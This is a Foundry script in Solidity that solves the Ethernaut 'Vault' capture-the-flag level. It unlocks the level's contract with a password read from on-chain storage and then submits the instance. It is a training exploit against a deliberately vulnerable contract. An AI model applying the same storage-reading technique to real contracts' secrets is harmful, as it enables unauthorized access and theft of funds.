// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Script, console2} from "forge-std/Script.sol";
import {EthernautHelper} from "../setup/EthernautHelper.sol";

// NOTE You can import your helper contracts & create interfaces here
interface IVault {
    function unlock(bytes32 _password) external;
}

contract ForceSolution is Script, EthernautHelper {
    address constant LEVEL_ADDRESS = 0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670;
    uint256 heroPrivateKey = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(heroPrivateKey);
        // NOTE this is the address of your challenge contract
        address challengeInstance = createInstance(LEVEL_ADDRESS);

        // fetch using Alchemy Composer -> getStorageAt
        bytes32 password = 0x412076657279207374726f6e67207365637265742070617373776f7264203a29;
        IVault(challengeInstance).unlock(password);

        // SUBMIT CHALLENGE. (DON'T EDIT)
        bool levelSuccess = submitInstance(challengeInstance);
        require(levelSuccess, "Challenge not passed yet");
        vm.stopBroadcast();

        console2.log(successMessage(8));
    }
}
